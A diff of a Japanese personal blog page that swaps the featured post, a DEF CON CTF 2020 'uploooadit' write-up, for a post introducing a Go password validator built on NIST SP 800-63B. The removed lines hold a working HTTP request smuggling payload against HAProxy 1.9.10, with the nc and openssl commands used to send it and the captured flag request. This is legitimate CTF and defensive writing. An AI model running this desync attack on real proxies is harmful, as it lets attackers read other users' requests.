@@ -29,7 +29,7 @@
 
 
 
-<meta property="og:updated_time" content="2020-05-18T23:00:00&#43;09:00"/>
+<meta property="og:updated_time" content="2020-07-05T12:00:00&#43;09:00"/>
 
 
 
@@ -175,6 +175,10 @@ ga('send', 'pageview');
 
                 
                     <li>
+                        <a href="https://blog.s-tajima.work/post/2020/nspv/"><p>GoでNIST SP 800-63Bに則ったPassword Validatorを作りました</p></a>
+                    </li>
+                
+                    <li>
                         <a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/"><p>DEF CON CTF Qualifier 2020 uploooadit WriteUp</p></a>
                     </li>
                 
@@ -188,10 +192,6 @@ ga('send', 'pageview');
                 
                     <li>
                         <a href="https://blog.s-tajima.work/post/2018/smart-contract-write-up_en/"><p>CODE BLUE 2018 Smart Contract Hacking Challenge WriteUp (en)</p></a>
-                    </li>
-                
-                    <li>
-                        <a href="https://blog.s-tajima.work/post/2018/smart-contract-write-up/"><p>CODE BLUE 2018 Smart Contract Hacking Challenge WriteUp</p></a>
                     </li>
                 
             </ul>
@@ -208,7 +208,7 @@ ga('send', 'pageview');
     <header>
     <div class="title">
         
-            <h2><a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/">DEF CON CTF Qualifier 2020 uploooadit WriteUp</a></h2>
+            <h2><a href="https://blog.s-tajima.work/post/2020/nspv/">GoでNIST SP 800-63Bに則ったPassword Validatorを作りました</a></h2>
         
         
     </div>
@@ -218,8 +218,8 @@ ga('send', 'pageview');
         
 
         <time class="published"
-            datetime='2020-05-18'>
-            May 18, 2020</time>
+            datetime='2020-07-05'>
+            July 5, 2020</time>
         <span class="author">Satoshi Tajima</span>
         
         
@@ -232,170 +232,130 @@ ga('send', 'pageview');
     <div id="content">
         
 
-<p>2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、<br />
-welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。</p>
+<p>インターネットのサービスを利用する上で、どんなパスワードを設定するかというのはアカウントを安全に保護する上で重要な要素になります。
+日常的にデータ漏洩がおこり、多くのパスワードリストが出回る現代においては、少し頭を捻って考えたくらいのパスワードだと、突破されてしまうリスクは非常に高いでしょう。</p>
 
-<p>最初の2つはチュートリアルなので割愛して、uploooaditのWriteUpを書きます。</p>
+<p>いちサービス利用者としては、パスワードマネージャーを使いサイトごとに個別のランダムな文字列をパスワードに設定しておくことで、そのリスクを低減することができます。
+サービスの提供者としては、適切なパスワードのバリデーションルールを設けることで、利用者が危険なパスワードを設定してしまうことを防ぐ事ができます。</p>
 
-<h1 id="ソースコードを確認">ソースコードを確認</h1>
+<p>しかし、 &ldquo;パスワードのバリデーションルール&rdquo; というのはサービスによってバラバラで、中にはかえって安全なパスワードを設定するのを阻むバリデーションルールも存在しています。</p>
+
+<p>『NIST Special Publication 800-63B Digital Identity Guidelines (NIST SP 800-63B)』というガイドライン(数年前に「パスワードの定期変更は不要」という記述が話題になったあの資料です) には、Memorized Secrets(つまりパスワードのこと)の設定時・変更時において、どのような基準でそれを受け入れるべきかというのが書かれています。このガイドライン自体は、アメリカの政府機関に向けたものなので、日本でサービスを提供する上では何ら強制力はないのですが、非常に参考になるものです。</p>
+
+<p>今回、この NIST SP 800-63B に書かれた推奨事項に則ったGo製のパスワードバリデーターを作成したので紹介します。
+<a href="https://github.com/s-tajima/nspv">https://github.com/s-tajima/nspv</a></p>
+
+<hr />
+
+<h1 id="nspvによるバリデーション">nspvによるバリデーション</h1>
+
+<h2 id="パスワードの文字列長">パスワードの文字列長</h2>
+
+<p>NIST SP 800-63B には、</p>
+
+<blockquote>
+<p>Verifiers SHALL require subscriber-chosen memorized secrets to be at least 8 characters in length.<br />
+Verifiers SHOULD permit subscriber-chosen memorized secrets at least 64 characters in length.</p>
+</blockquote>
+
+<p>ということで、</p>
 
 <ul>
-<li>Flaskで書かれたPythonのWebアプリケーション</li>
-<li>エンドポイントは以下の3つ
-
-<ul>
-<li>GET / &hellip; 空のページです。</li>
-<li>POST /files/ &hellip; X-guidというリクエストヘッダに記載された文字列の通りのパスにファイルを保存します。</li>
-<li>GET /files/ &hellip; POST /files/ でアップロードしたファイルのコンテンツを返します。</li>
-</ul></li>
+<li>パスワードは最低8文字であることをもとめなければならず</li>
+<li>パスワードは最低64文字を許容するべきである</li>
 </ul>
 
-<h1 id="稼働環境を確認">稼働環境を確認</h1>
+<p>と書かれています。</p>
 
-<p>普通にリクエストを投げてみて、HAProxy + gunicorn/20.0.0の構成ということがわかります。</p>
+<p>これは特に難しいことではなく、単純に文字列長を確認することで実現します。</p>
 
-<pre><code>$ curl -sv https://uploooadit.oooverflow.io/
-.. snip ..
-&lt; HTTP/1.1 204 NO CONTENT
-&lt; Server: gunicorn/20.0.0
-&lt; Date: Sat, 16 May 2020 13:05:18 GMT
-&lt; Content-Type: text/html; charset=utf-8
-&lt; Via: haproxy
-.. snip ..
-</code></pre>
+<h2 id="よく使われる-漏洩したことのあるパスワード">よく使われる、漏洩したことのあるパスワード</h2>
 
-<p>今度はエラーになるようなリクエストを投げてみて、HAProxyのバージョンは1.9.10ということがわかります。<br />
-<a href="https://www.haproxy.org/download/1.9/src/CHANGELOG">https://www.haproxy.org/download/1.9/src/CHANGELOG</a> を見ると、2019/08/08のリリースと若干古いのが気になります。</p>
+<p>この項目がとても重要です。</p>
 
-<pre><code>$ curl -sv https://uploooadit.oooverflow.io/あ
-&lt; HTTP/1.0 400 Bad request
-&lt; Server: haproxy 1.9.10
-&lt; Cache-Control: no-cache
-&lt; Connection: close
-&lt; Content-Type: text/html
-&lt;
-&lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt;
-Your browser sent an invalid request.
-&lt;/body&gt;&lt;/html&gt;
-.. snip ..
-</code></pre>
-
-<p>SSRFやHTTP request smugglingあたりができるのではと疑い、
-調べてみると HAProxy の HTTP request smuggling というそのまんまの記事が見つかります。</p>
+<blockquote>
+<p>verifiers SHALL compare the prospective secrets against a list that contains values known to be commonly-used, expected, or compromised. For example, the list MAY include, but is not limited to:</p>
 
 <ul>
-<li><a href="https://nathandavison.com/blog/haproxy-http-request-smuggling">https://nathandavison.com/blog/haproxy-http-request-smuggling</a></li>
-<li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li>
+<li>Passwords obtained from previous breach corpuses.<br /></li>
+<li>Dictionary words.<br /></li>
+<li>Repetitive or sequential characters (e.g. ‘aaaaaa’, ‘1234abcd’).<br /></li>
 </ul>
+</blockquote>
 
-<p>この時点でこんな仮説をたてました。</p>
+<p>ということで、</p>
 
 <ul>
-<li>フラグが含まれたObjectに対するアクセス、ないしはフラグをアップロードするアクセスが、定常的にリクエストされている。</li>
-<li>HTTP request smugglingによって、そのアクセスの内容を盗み取る必要がある。</li>
+<li>よく使われていたり、推測可能だったり、侵害されたパスワードではないことを確認しなければならない</li>
 </ul>
 
-<h1 id="ローカルで検証環境の作成">ローカルで検証環境の作成</h1>
+<p>と書かれています。</p>
 
-<p>適当に立ち上げたEC2上に&hellip;</p>
+<p>これを実現するために、 <a href="https://haveibeenpwned.com/">Have I Been Pwned</a> の <a href="https://haveibeenpwned.com/API/v3#PwnedPasswords">PwnedPasswords API</a> を利用しています。</p>
+
+<p>PwnedPasswords API は、k-匿名化という手法を使って、APIにパスワード自体を送信することなく、そのパスワードが侵害されたものかを確認することができます。</p>
+
+<h2 id="コンテキストから推測可能なパスワード">コンテキストから推測可能なパスワード</h2>
+
+<p>上記のリストには、</p>
+
+<blockquote>
+<ul>
+<li>Context-specific words, such as the name of the service, the username, and derivatives thereof.</li>
+</ul>
+</blockquote>
+
+<p>ということで、</p>
 
 <ul>
-<li>HAProxyの1.9.10を用意 (ソースコードからコンパイル)</li>
-<li>gunicornを用意 (pipでインストール)</li>
-<li>提供された app.py, store.py を使用 (S3StoreはLocalStoreに切り替え)</li>
+<li>サービス名やユーザーネームのような、コンテキストに特化した単語と、その派生</li>
 </ul>
 
-<p>という形で環境をつくります。</p>
+<p>も禁止しなければならないと書かれています。</p>
 
-<p>そして、まずはRubyでこんなPayloadを作成。</p>
+<p>これは、任意のカスタム辞書を登録できるようにし、その文字列とパスワードのレーベンシュタイン距離をとることで、推測可能なパスワードになっていないかを判定します。</p>
 
-<ul>
-<li>payload.rb</li>
-</ul>
+<h1 id="nspvの使い方">nspvの使い方</h1>
 
-<pre><code>payload = &lt;&lt;EOP
-POST /files/ HTTP/1.1\r
-Host: uploooadit.oooverflow.io\r
-X-guid: 11111111-2222-3333-1111-111111111112\r
-Content-Type: text/plain\r
-Content-Length: 4\r
-\r
-test\r
+<h2 id="ベーシックな使い方">ベーシックな使い方</h2>
 
-EOP
-print payload 
+<p>nspvのベーシックな使い方はこのとおりです。</p>
+
+<pre><code class="language-go">v := nspv.NewValidator()
+v.SetDict([]string{&quot;nist-sp-800-63&quot;})
+
+result, err := v.Validate(&quot;_sup3r_comp1ex_passw0rd_&quot;)
+if err != nil {
+    // HIBPのAPIへのリクエストが失敗した等、バリデーションの実行に問題があった場合は err が返ります。
+}
+if result != nspv.Ok {
+    // バリデーションの失敗は result で表現します。
+}
+fmt.Println(result.String()) // Ok
 </code></pre>
 
-<p>こんな形でトライ&amp; エラーを繰り返せる状態を作ります。</p>
+<h2 id="カスタムした使い方">カスタムした使い方</h2>
 
-<pre><code>$ ruby payload.rb | nc localhost 1080
+<pre><code class="language-go">v := nspv.NewValidator()
+v.SetHibpThreshold(3) // PwnedPasswords API が返すパスワードの漏洩回数もとに、一定回数まで許容することができます。
+v.SetLevenshteinThreshold(4) // カスタム辞書とのレーベンシュタイン距離のしきい値を変更することができます。
+
+v.Validate(&quot;_sup3r_comp1ex_passw0rd_&quot;)
 </code></pre>
 
-<p>tcpdumpも使い、パケットを見ながら調整していくと、こんな形でうまくいきそうなことがわかります。</p>
+<hr />
 
-<ul>
-<li>payload.rb</li>
-</ul>
+<p>最後に一番大事なこととして、 NIST SP 800-63B には</p>
 
-<pre><code>payload = &lt;&lt;EOP.chomp
-POST /files/ HTTP/1.1\r
-Host: uploooadit.oooverflow.io\r
-X-guid: 11111111-2222-3333-1111-111111111112\r
-Content-Type: text/plain\r
-Content-Length: 158\r
-Transfer-Encoding: \x0bchunked\r
-\r
-0\r
-\r
-POST /files/ HTTP/1.1\r
-Host: uploooadit.oooverflow.io\r
-X-guid: 11111111-2222-3333-1111-111111111119\r
-Content-Type: text/plain\r
-Content-Length: 388\r
-\r
-test
-EOP
+<blockquote>
+<p>Verifiers SHOULD NOT impose other composition rules (e.g., requiring mixtures of different character types or prohibiting consecutively repeated characters) for memorized secrets.</p>
+</blockquote>
 
-print payload 
-sleep(10)
-</code></pre>
+<p>ということで、一般的に使われる &ldquo;複数の文字種を混ぜることを求める&rdquo; &ldquo;連続して繰り返される文字を禁止する&rdquo; のような、追加のルールを強制すべきではないとも書かれています。
+よって、nspvは上記3つの観点以外ではパスワードのバリデーションを行いません。</p>
 
-<ul>
-<li>コマンド</li>
-</ul>
-
-<pre><code class="language-bash">$ unbuffer ruby payload.rb | nc localhost 1080
-$ curl http://localhost:1080/files/11111111-2222-3333-1111-111111111119
-</code></pre>
-
-<h1 id="実環境でのトライ">実環境でのトライ</h1>
-
-<p>実際の環境はhttpsなので、ncをopenssl s_clientにし、かつ Content-Length も調整していき&hellip;<br />
-最終的に以下のようなコマンドにてリクエストを盗み見ることに成功。</p>
-
-<pre><code class="language-bash">$ unbuffer ruby payload.rb | openssl s_client -connect uploooadit.oooverflow.io:443
-$ curl http://localhost:1080/files/11111111-2222-3333-1111-111111111119
-</code></pre>
-
-<p>リクエストのBodyにFLAGがありました。</p>
-
-<pre><code>tesPOST /files/ HTTP/1.1
-Host: 127.0.0.1:8080
-User-Agent: invoker
-Accept-Encoding: gzip, deflate
-Accept: */*
-Content-Type: text/plain
-X-guid: 85a290de-9877-4d90-82ea-fe0700a570b0
-Content-Length: 152
-X-Forwarded-For: 127.0.0.1
-
-Congratulations!
-OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}
-</code></pre>
-
-<p>以上、久しぶりに参加したCTFのWriteUpでした。<br />
-いつもCTFは遊び参加で数問見てみて終わりみたいになるんだけど、<br />
-そろそろチームとか組んでがっつり時間確保して上位に入るのを目指すような参加をしたい。</p>
+<p>一般消費者向けサービスとしては<a href="https://fidoalliance.org/fido2/">FIDO2</a>やSlackのMagic Link のようなPasswordLess Authenticationが広まっていったり、企業においてはSSOのような仕組みが広がることで、パスワード自体を設定する必要のあるサービスというのは徐々に減っていくとは思います。
+しかし、それができずどうしてもパスワードが必要になる場面において、少しでも &ldquo;マシな&rdquo; パスワードが設定されることの助けになったらいいなと思っています。</p>
 
     </div>
 
@@ -434,43 +394,43 @@ OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest t
             
 
 
-<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&text=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp&via=s_tajima" target="_blank" class="share-btn twitter">
+<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f&text=Go%e3%81%a7NIST%20SP%20800-63B%e3%81%ab%e5%89%87%e3%81%a3%e3%81%9fPassword%20Validator%e3%82%92%e4%bd%9c%e3%82%8a%e3%81%be%e3%81%97%e3%81%9f&via=s_tajima" target="_blank" class="share-btn twitter">
     <i class="fa fa-twitter"></i>
     <p>Twitter</p>
 </a></li>
 
 
-<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn google-plus">
+<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f" target="_blank" class="share-btn google-plus">
     <i class="fa fa-google-plus"></i>
     <p>Google+</p>
 </a></li>
 
 
-<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn facebook">
+<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f" target="_blank" class="share-btn facebook">
     <i class="fa fa-facebook"></i>
     <p>Facebook</p>
 </a></li>
 
 
-<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn reddit">
+<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f&title=Go%e3%81%a7NIST%20SP%20800-63B%e3%81%ab%e5%89%87%e3%81%a3%e3%81%9fPassword%20Validator%e3%82%92%e4%bd%9c%e3%82%8a%e3%81%be%e3%81%97%e3%81%9f" target="_blank" class="share-btn reddit">
     <i class="fa fa-reddit-alien"></i>
     <p>Reddit</p>
 </a></li>
 
 
-<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn linkedin">
+<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f&title=Go%e3%81%a7NIST%20SP%20800-63B%e3%81%ab%e5%89%87%e3%81%a3%e3%81%9fPassword%20Validator%e3%82%92%e4%bd%9c%e3%82%8a%e3%81%be%e3%81%97%e3%81%9f" target="_blank" class="share-btn linkedin">
     <i class="fa fa-linkedin"></i>
     <p>LinkedIn</p>
 </a></li>
 
 
-<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn stumbleupon">
+<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f&title=Go%e3%81%a7NIST%20SP%20800-63B%e3%81%ab%e5%89%87%e3%81%a3%e3%81%9fPassword%20Validator%e3%82%92%e4%bd%9c%e3%82%8a%e3%81%be%e3%81%97%e3%81%9f" target="_blank" class="share-btn stumbleupon">
     <i class="fa fa-stumbleupon"></i>
     <p>StumbleUpon</p>
 </a></li>
 
 
-<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn email">
+<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f" target="_blank" class="share-btn email">
     <i class="fa fa-envelope"></i>
     <p>Email</p>
 </a></li>
@@ -480,8 +440,8 @@ OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest t
 </article>
 <ul class="actions pagination">
     
-        <li><a href="https://blog.s-tajima.work/post/2019/input-output/"
-                class="button big previous">2019年のインプット・アウトプットまとめ</a></li>
+        <li><a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/"
+                class="button big previous">DEF CON CTF Qualifier 2020 uploooadit WriteUp</a></li>
     
 
     
@@ -500,43 +460,43 @@ OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest t
             
 
 
-<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&text=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp&via=s_tajima" target="_blank" class="share-btn twitter">
+<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f&text=Go%e3%81%a7NIST%20SP%20800-63B%e3%81%ab%e5%89%87%e3%81%a3%e3%81%9fPassword%20Validator%e3%82%92%e4%bd%9c%e3%82%8a%e3%81%be%e3%81%97%e3%81%9f&via=s_tajima" target="_blank" class="share-btn twitter">
     <i class="fa fa-twitter"></i>
     <p>Twitter</p>
 </a></li>
 
 
-<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn google-plus">
+<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f" target="_blank" class="share-btn google-plus">
     <i class="fa fa-google-plus"></i>
     <p>Google+</p>
 </a></li>
 
 
-<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn facebook">
+<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f" target="_blank" class="share-btn facebook">
     <i class="fa fa-facebook"></i>
     <p>Facebook</p>
 </a></li>
 
 
-<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn reddit">
+<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f&title=Go%e3%81%a7NIST%20SP%20800-63B%e3%81%ab%e5%89%87%e3%81%a3%e3%81%9fPassword%20Validator%e3%82%92%e4%bd%9c%e3%82%8a%e3%81%be%e3%81%97%e3%81%9f" target="_blank" class="share-btn reddit">
     <i class="fa fa-reddit-alien"></i>
     <p>Reddit</p>
 </a></li>
 
 
-<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn linkedin">
+<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f&title=Go%e3%81%a7NIST%20SP%20800-63B%e3%81%ab%e5%89%87%e3%81%a3%e3%81%9fPassword%20Validator%e3%82%92%e4%bd%9c%e3%82%8a%e3%81%be%e3%81%97%e3%81%9f" target="_blank" class="share-btn linkedin">
     <i class="fa fa-linkedin"></i>
     <p>LinkedIn</p>
 </a></li>
 
 
-<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn stumbleupon">
+<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f&title=Go%e3%81%a7NIST%20SP%20800-63B%e3%81%ab%e5%89%87%e3%81%a3%e3%81%9fPassword%20Validator%e3%82%92%e4%bd%9c%e3%82%8a%e3%81%be%e3%81%97%e3%81%9f" target="_blank" class="share-btn stumbleupon">
     <i class="fa fa-stumbleupon"></i>
     <p>StumbleUpon</p>
 </a></li>
 
 
-<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn email">
+<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fnspv%2f" target="_blank" class="share-btn email">
     <i class="fa fa-envelope"></i>
     <p>Email</p>
 </a></li>
@@ -644,6 +604,20 @@ OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest t
                     <li>
                         <article>
                             <header>
+                                <h3><a href="https://blog.s-tajima.work/post/2020/nspv/">GoでNIST SP 800-63Bに則ったPassword Validatorを作りました</a></h3>
+                                
+                                    
+                                
+                                <time class="published" datetime=
+                                    '2020-07-05'>
+                                    July 5, 2020</time>
+                            </header>
+                        </article>
+                    </li>
+                
+                    <li>
+                        <article>
+                            <header>
                                 <h3><a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/">DEF CON CTF Qualifier 2020 uploooadit WriteUp</a></h3>
                                 
                                     
@@ -697,20 +671,6 @@ OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest t
                         </article>
                     </li>
                 
-                    <li>
-                        <article>
-                            <header>
-                                <h3><a href="https://blog.s-tajima.work/post/2018/smart-contract-write-up/">CODE BLUE 2018 Smart Contract Hacking Challenge WriteUp</a></h3>
-                                
-                                    
-                                
-                                <time class="published" datetime=
-                                    '2018-11-08'>
-                                    November 8, 2018</time>
-                            </header>
-                        </article>
-                    </li>
-                
 
                 
                     <li>
@@ -745,7 +705,7 @@ OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest t
                         <article>
                             <header>
                                 <a href="/categories//"></a>
-                                <span style="float:right;">5</span>
+                                <span style="float:right;">6</span>
                             </header>
                         </article>
                     </li>
@@ -772,7 +732,7 @@ OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest t
                         <article>
                             <header>
                                 <a href="/categories/ja/">ja</a>
-                                <span style="float:right;">12</span>
+                                <span style="float:right;">13</span>
                             </header>
                         </article>
                     </li>
